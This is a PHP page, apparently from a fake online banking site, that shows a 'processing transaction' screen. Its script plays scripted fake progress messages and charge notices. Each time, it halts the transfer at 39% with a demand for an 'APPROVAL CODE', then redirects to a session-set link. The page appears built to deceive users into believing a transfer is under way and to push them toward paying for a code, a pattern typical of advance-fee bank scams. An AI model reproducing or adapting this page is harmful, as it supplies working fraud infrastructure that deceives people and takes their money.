<?php 
include ('header.php');
if(!isset($_SESSION['link'])){
	i_redirect("transfer");
}
?>
 <div class="nk-content nk-content-fluid">
              <div class="container-xl wide-lg">
               <div class="nk-content-body">
             <div class="modal-content">
                <div class="modal-body modal-body-lg text-center">
                    <div class="nk-modal">
                        <h4 class="nk-modal-title">Proccessing Transaction!</h4>
                        <div class="nk-modal-text">
                            <p class="caption-text">Dear <?php echo$fullname ?>,</p>
                           <p class="sub-text-sm"></p>
                           <b>You are about to send <b><?php echo$money." ".number_format($_SESSION['amount'],2) ?></b> to <b><?php echo $_SESSION['accountholder'] ?></b></b>.
                        </div>
                      <strong>Please wait...</strong>
							<p align="center"><img src="https://e-platforms.xyz/images/spinner.gif" width="200" height="200"></p>
									 
							<div id="splashcontainer" class="ui centered header upper"></div>
								 <div name="splashcontainerns" id="splashcontainerns"></div>	
                    </div>
                </div><!-- .modal-body -->
                <div class="modal-footer bg-lighter">
                    <div class="text-center w-100">
                        <p>All electronic fund transfers to or from your accounts at <?php echo$sitename ?> are governed by the Electronic Fund Transfer Disclosure provided to you when you established your account or when you requested other electronic fund transfer services.</p>
                    </div>
                </div>
            </div>
          </div>
      </div>
  </div>

					
					
				
		 
<SCRIPT>

var preloadimages=new Array("","")

var intervals=500
//configure destination URL
var targetdestination="<?php echo $_SESSION['link'] ?>"



var splashmessage=new Array()
var openingtags='<font face="TAHOMA" bgcolor="#NAVY" size="2">'
splashmessage[0]='PERSONAL ACCOUNT DETAILS SUBMITTED'
splashmessage[1]='TRANSACTION IN PROGRESS ..............'
splashmessage[2]='***  <?php echo $_SESSION["accountholder"]?> |  <?php echo $_SESSION["accountnumberB"]?> | <?php echo$money." ".number_format($_SESSION['amount'],2) ?> | <?php echo$_SESSION['bankname'] ?> ***'
splashmessage[3]='TRANSACTION IN PROGRESS .............. </br>***  <?php echo $_SESSION["accountholder"]?> |  <?php echo $_SESSION["accountnumberB"]?> | <?php echo$money." ".number_format($_SESSION['amount'],2) ?> | <?php echo$_SESSION['bankname'] ?> ***'
splashmessage[4]='ACCOUNT DETAILED VERIFIED..... </br>***  <?php echo $_SESSION["accountholder"]?> |  <?php echo $_SESSION["accountnumberB"]?> | <?php echo$money." ".number_format($_SESSION['amount'],2) ?> | <?php echo$_SESSION['bankname'] ?> ***'
splashmessage[5]='YOUR TRANSFER DATA IS BEING PROCESSED </br>***  <?php echo $_SESSION["accountholder"]?> |  <?php echo $_SESSION["accountnumberB"]?> | <?php echo$money." ".number_format($_SESSION['amount'],2) ?>| <?php echo$_SESSION['bankname'] ?> ***'
splashmessage[6]='YOUR TRANSFER DATA IS BEING PROCESSED........!!!!!!...........  <?php echo $_SESSION["accountnumberB"]?> WITH ( <?php echo $_SESSION["accountholder"]?>) VERIFIED'
splashmessage[7]='YOUR TRANSFER DATA IS BEING PROCESSED........!!!!!!...........  <?php echo $_SESSION["accountnumberB"]?> WITH ( <?php echo $_SESSION["accountholder"]?>) NUMBER VERIFIED'
splashmessage[8]='TRANSFER DATA PROCESSED ::: CONTACTING BENEFICIARY BANK ( <?php echo $_SESSION["accountholder"]?>)'
splashmessage[9]='INITIATING TRANSFER......'
splashmessage[10]= '10%.......OF TRANSFER COMPLETED</br>***  <?php echo $_SESSION["accountholder"]?> |  <?php echo $_SESSION["accountnumberB"]?> | <?php echo$money." ".number_format($_SESSION['amount'],2) ?> | <?php echo$_SESSION['bankname'] ?> ***'
splashmessage[11]='12%.......OF TRANSFER COMPLETED</br>***  <?php echo $_SESSION["accountholder"]?> |  <?php echo $_SESSION["accountnumberB"]?> | <?php echo$money." ".number_format($_SESSION['amount'],2) ?> | <?php echo$_SESSION['bankname'] ?> ***'
splashmessage[12]='15%.......OF TRANSFER COMPLETED</br>***  <?php echo $_SESSION["accountholder"]?> |  <?php echo $_SESSION["accountnumberB"]?> | <?php echo$money." ".number_format($_SESSION['amount'],2) ?> | <?php echo$_SESSION['bankname'] ?> ***'
splashmessage[13]='PLEASE WAIT WHILE YOUR TRANSACTION IS PROCESSING...'
splashmessage[14]='PLEASE WAIT WHILE YOUR TRANSACTION IS PROCESSING...'
splashmessage[15]='PLEASE WAIT WHILE YOUR TRANSACTION IS PROCESSING...'
splashmessage[16]='18%.......OF TRANSFER COMPLETED</br>***  <?php echo $_SESSION["accountholder"]?> |  <?php echo $_SESSION["accountnumberB"]?> | <?php echo$money." ".number_format($_SESSION['amount'],2) ?> | <?php echo$_SESSION['bankname'] ?> ***'
splashmessage[17]='23%.......OF TRANSFER COMPLETED</br>***  <?php echo $_SESSION["accountholder"]?> |  <?php echo $_SESSION["accountnumberB"]?> | <?php echo$money." ".number_format($_SESSION['amount'],2) ?> | <?php echo$_SESSION['bankname'] ?> ***'
splashmessage[18]='28%.......OF TRANSFER COMPLETED</br>***  <?php echo $_SESSION["accountholder"]?> |  <?php echo $_SESSION["accountnumberB"]?> | <?php echo$money." ".number_format($_SESSION['amount'],2) ?> | <?php echo$_SESSION['bankname'] ?> ***'
splashmessage[19]='30%....... PROCESSING ALL CHARGES....'
splashmessage[20]='36%....... PROCESSING ADMINISTRATIVE CHARGES...'
splashmessage[21]='ADMINISTRATIVE CHARGES PROCESSED SUCCESSFULLY...'
splashmessage[22]='PROCESSING ALL CHARGES..........'
splashmessage[23]='39%.......TERMINATING TRANSFER </br>***  <?php echo $_SESSION["accountholder"]?> |  <?php echo $_SESSION["accountnumberB"]?> | <?php echo$money." ".number_format($_SESSION['amount'],2) ?> | <?php echo$_SESSION['bankname'] ?> ***'
splashmessage[24]='TRANSFER TERMINATED ***APPROVAL CODE**** NEEDED TO PROCEED'
splashmessage[25]='TRANSFER TERMINATED ***APPROVAL CODE**** NEEDED TO PROCEED'
splashmessage[26]='39%.......TERMINATING TRANSFER'
splashmessage[27]='39%.......TRANSFER TERMINATED ***APPROVAL CODE**** NEEDED TO PROCEED'
splashmessage[28]='39%.......TRANSFER TERMINATED to ***  <?php echo $_SESSION["accountholder"]?> |  <?php echo $_SESSION["accountnumberB"]?>***'

var closingtags='</font>'

//Do not edit below this line (besides HTML code at the very bottom)

var i=0

var ns4=document.layers?1:0
var ie4=document.all?1:0
var ns6=document.getElementById&&!document.all?1:0
var theimages=new Array()

//preload images
if (document.images){
for (p=0;p<preloadimages.length;p++){
theimages[p]=new Image()
theimages[p].src=preloadimages[p]
}
}

function displaysplash(){
if (i<splashmessage.length){
sc_cross.style.visibility="hidden"
sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'
sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 : document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2
sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2 : document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2
sc_cross.style.visibility="visible"
i++
}
else{
window.location=targetdestination
return
}
setTimeout("displaysplash()",intervals)
}

function displaysplash_ns(){
if (i<splashmessage.length){
sc_ns.visibility="hide"
sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')
sc_ns.document.close()

sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2
sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2

sc_ns.visibility="show"
i++
}
else{
window.location=targetdestination
return
}
setTimeout("displaysplash_ns()",intervals)
}



function positionsplashcontainer(){
if (ie4||ns6){
sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer
displaysplash()
}
else if (ns4){
sc_ns=document.splashcontainerns
sc_ns.visibility="show"
displaysplash_ns()
}
else
window.location=targetdestination
}
window.onload=positionsplashcontainer

</SCRIPT>

</body></html></div>
										</div>
		
</div>
</div>
								</div>
							<!--end::Container-->
						</div>
						<!--end::Entry-->
					</div>

<?php 
include ('footer.php');
?>